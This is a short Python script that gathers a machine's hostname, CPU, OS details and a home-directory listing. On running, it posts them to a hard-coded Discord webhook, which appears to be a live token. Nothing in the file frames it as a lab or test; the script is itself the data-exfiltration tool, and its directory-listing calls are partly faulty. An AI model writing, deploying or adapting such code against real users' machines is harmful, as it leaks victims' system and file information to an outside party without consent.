import platform
import subprocess
import requests

# Function to gather system information for Windows
def get_system_info_windows():
    system_info = []
    system_info.append("System Information:")
    system_info.append("-------------------")
    system_info.append(f"Hostname: {platform.node()}")
    system_info.append(f"CPU: {platform.processor()}")
    system_info.append(f"OS: {platform.platform()}")
    system_info.append("")
    system_info.append("Files in home directory:")
    system_info.append("------------------------")
    try:
        home_directory_files = subprocess.check_output(["dir", "%USERPROFILE%"]).decode("utf-8")
        system_info.append(home_directory_files)
    except Exception as e:
        system_info.append("Error retrieving home directory files: " + str(e))
    return "\n".join(system_info)

# Function to gather system information for Unix-like systems
def get_system_info_unix():
    system_info = []
    system_info.append("System Information:")
    system_info.append("-------------------")
    system_info.append(f"Hostname: {platform.node()}")
    system_info.append(f"CPU: {platform.processor()}")
    system_info.append(f"OS: {platform.platform()}")
    system_info.append("")
    system_info.append("Files in home directory:")
    system_info.append("------------------------")
    try:
        home_directory_files = subprocess.check_output(["ls", "-lh", "~"]).decode("utf-8")
        system_info.append(home_directory_files)
    except Exception as e:
        system_info.append("Error retrieving home directory files: " + str(e))
    return "\n".join(system_info)

# Function to gather system information based on the operating system
def get_system_info():
    if platform.system() == "Windows":
        return get_system_info_windows()
    else:
        return get_system_info_unix()

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1041899162838503514/XXZcPRwngW3GeyyzBz5heOG-y9R7OZtMaP3U2rPnCy_jVV6SX01Zp4vzPvqNwagFlusI"

# Get system information
system_info = get_system_info()

# Prepare message
message = {
    "content": system_info
}

# Send message to Discord webhook
response = requests.post(WEBHOOK_URL, json=message)

# Check if message was sent successfully
if response.status_code == 204:
    print("System information sent to Discord webhook successfully!")
else:
    print(f"Failed to send system information to Discord webhook. Status code: {response.status_code}")
